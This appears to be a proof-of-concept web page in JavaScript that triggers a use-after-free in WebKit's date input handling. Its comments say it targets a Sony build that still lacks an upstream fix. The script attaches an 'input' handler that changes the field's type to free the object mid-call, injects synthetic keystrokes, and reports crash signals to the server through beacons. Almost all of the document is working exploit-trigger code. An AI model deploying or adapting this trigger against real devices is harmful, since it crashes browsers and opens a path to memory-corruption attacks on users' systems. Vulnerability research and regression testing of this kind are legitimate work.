// Candidate #1: use-after-free in BaseDateAndTimeInputType::didChangeValueFromControl
//
// Upstream fix 869d5c55 (bugs.webkit.org 310544). Sony's tree still has the vulnerable
// shape: the function dispatches `input` with no RefPtr protecting itself, so a handler
// that changes input.type destroys the InputType object, and the next two statements
// operate on freed memory.
//
// Reachability constraint: the date field's elements live in a UA shadow root, so JS
// cannot dispatch at them. This page therefore tries both — synthetic key events first
// (cheap, might work) and then asks for a real keyboard, which is the path the upstream
// regression test uses.
//
// Signals: DATE-INPUT-FIRED then DATE-TYPE-CHANGED mean the handler ran (so the C++
// continued into freed memory). No DATE-SURVIVED afterwards means the WebProcess died.
(function () {
  var SENT = {};
  function B(tag) {
    if (SENT[tag]) return;
    SENT[tag] = 1;
    try { navigator.sendBeacon('/beacon/' + tag + '?t=' + Date.now()); } catch (e) {}
  }

  B('DATE-BOOT');

  var style = document.createElement('style');
  style.textContent =
    'body{background:#111;color:#eee;font:22px/1.5 monospace;margin:0;padding:28px}' +
    'h2{font-size:30px;margin:0 0 10px}' +
    '.box{background:#1d1d1d;border:1px solid #444;padding:18px;margin:14px 0}' +
    'input{font-size:44px;padding:10px;width:420px;background:#fff;color:#000}' +
    '.k{color:#7fd1ff}';
  document.head.appendChild(style);

  document.body.innerHTML =
    '<h2>date-input UAF &mdash; candidate 1</h2>' +
    '<div class="box">' +
    'Step 1 &mdash; attach a <b>USB keyboard</b> and press a key so the guide accepts input.<br>' +
    'Step 2 &mdash; the field below should already be focused. Type, pressing ' +
    '<span class="k">&rarr;</span> between fields:<br>' +
    '<span class="k">9 &rarr; 2 &rarr; 2 0 1 2</span>' +
    '</div>';

  var input = document.createElement('input');
  input.type = 'date';
  input.id = 'd';
  document.body.appendChild(input);

  input.addEventListener('input', function () {
    B('DATE-INPUT-FIRED');
    // This is the whole bug: replacing the input type frees the object whose method is
    // still on the stack.
    input.type = 'text';
    B('DATE-TYPE-CHANGED');
  });

  try { input.focus(); B('DATE-FOCUSED'); } catch (e) { B('DATE-FOCUS-ERR'); }

  // Long shot: some WebKit shadow fields still see DOM-dispatched keydowns because the
  // handler is a default event handler rather than a trusted-input path.
  var seq = ['9', 'ArrowRight', '2', 'ArrowRight', '2', '0', '1', '2'];
  var i = 0;
  function poke() {
    if (i >= seq.length) { B('DATE-SYNTH-DONE'); return; }
    var key = seq[i++];
    try {
      var ev = new KeyboardEvent('keydown', {
        key: key, code: key, keyCode: key.length === 1 ? key.charCodeAt(0) : 39,
        which: key.length === 1 ? key.charCodeAt(0) : 39,
        bubbles: true, cancelable: true, composed: true
      });
      (document.activeElement || input).dispatchEvent(ev);
      document.dispatchEvent(ev);
    } catch (e) {}
    setTimeout(poke, 60);
  }
  setTimeout(poke, 400);

  setTimeout(function () { B('DATE-SURVIVED'); }, 6000);
})();
